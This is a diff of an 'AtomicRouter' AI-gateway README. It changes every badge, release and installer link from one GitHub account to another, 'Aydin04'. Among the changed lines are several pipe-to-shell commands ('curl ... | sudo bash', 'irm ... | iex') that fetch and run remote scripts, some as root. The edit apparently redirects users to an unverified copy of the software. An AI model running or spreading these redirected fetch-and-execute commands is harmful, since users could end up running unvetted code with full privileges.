@@ -8,7 +8,7 @@
 [![Node: 22 LTS](https://img.shields.io/badge/Node.js-22%20LTS-green.svg)](https://nodejs.org)
 [![Platform: Linux | macOS | Windows | ARM64](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows%20%7C%20ARM64-blueviolet.svg)](#installation)
 [![RAM: ~50MB Footprint](https://img.shields.io/badge/Memory-~50MB%20Optimized-cyan.svg)](#performance--footprint)
-[![Release: v3.8.50](https://img.shields.io/badge/Release-v3.8.50-brightgreen.svg)](https://github.com/dianrestu/atomic-router/releases)
+[![Release: v3.8.50](https://img.shields.io/badge/Release-v3.8.50-brightgreen.svg)](https://github.com/Aydin04/atomic-router/releases)
 
 <p align="center">
   <b>A unified, resilient, and blazing-fast AI gateway that bridges 330+ LLM providers into standard OpenAI-compatible endpoints with intelligent multi-account failover, dynamic load balancing, proxy pooling, and real-time stream compression.</b>
@@ -138,7 +138,7 @@ AtomicRouter is engineered specifically for low-overhead, high-throughput edge a
 Deploy AtomicRouter as a persistent background daemon on Ubuntu, Debian, CentOS, Rocky Linux, or Arch Linux:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/dianrestu/atomic-router/main/install.sh | sudo bash
+curl -fsSL https://raw.githubusercontent.com/Aydin04/atomic-router/main/install.sh | sudo bash
 ```
 
 The installer automatically:
@@ -154,11 +154,11 @@ The installer automatically:
 #### Method A: 1-Line PowerShell Quickstart
 Open **PowerShell** (Run as Administrator or Normal User):
 ```powershell
-irm https://raw.githubusercontent.com/dianrestu/atomic-router/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/Aydin04/atomic-router/main/install.ps1 | iex
 ```
 
 #### Method B: Manual Archive Download
-1. Download **`atomic-router-windows-x64.zip`** from [Latest Releases](https://github.com/dianrestu/atomic-router/releases/latest).
+1. Download **`atomic-router-windows-x64.zip`** from [Latest Releases](https://github.com/Aydin04/atomic-router/releases/latest).
 2. Extract the archive to your desired directory.
 3. Double-click **`start.bat`**.
 4. Navigate to **`http://localhost:20128/`** in your browser.
@@ -169,11 +169,11 @@ irm https://raw.githubusercontent.com/dianrestu/atomic-router/main/install.ps1 |
 
 #### Method A: 1-Line Terminal Quickstart
 ```bash
-curl -fsSL https://raw.githubusercontent.com/dianrestu/atomic-router/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/Aydin04/atomic-router/main/install.sh | bash
 ```
 
 #### Method B: Manual Extraction
-1. Download **`atomic-router-macos-universal.tar.gz`** from [Latest Releases](https://github.com/dianrestu/atomic-router/releases/latest).
+1. Download **`atomic-router-macos-universal.tar.gz`** from [Latest Releases](https://github.com/Aydin04/atomic-router/releases/latest).
 2. Extract and run:
    ```bash
    tar -xzf atomic-router-macos-universal.tar.gz -C ~/atomic-router
@@ -189,7 +189,7 @@ curl -fsSL https://raw.githubusercontent.com/dianrestu/atomic-router/main/instal
 Compatible with Raspberry Pi 4/5, Orange Pi, AWS Graviton, and Ampere ARM64 instances:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/dianrestu/atomic-router/main/install.sh | sudo bash
+curl -fsSL https://raw.githubusercontent.com/Aydin04/atomic-router/main/install.sh | sudo bash
 ```
 
 ---
@@ -199,7 +199,7 @@ curl -fsSL https://raw.githubusercontent.com/dianrestu/atomic-router/main/instal
 Run a local AI proxy directly on your Android device:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/dianrestu/atomic-router/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/Aydin04/atomic-router/main/install.sh | bash
 ```
 
 ---
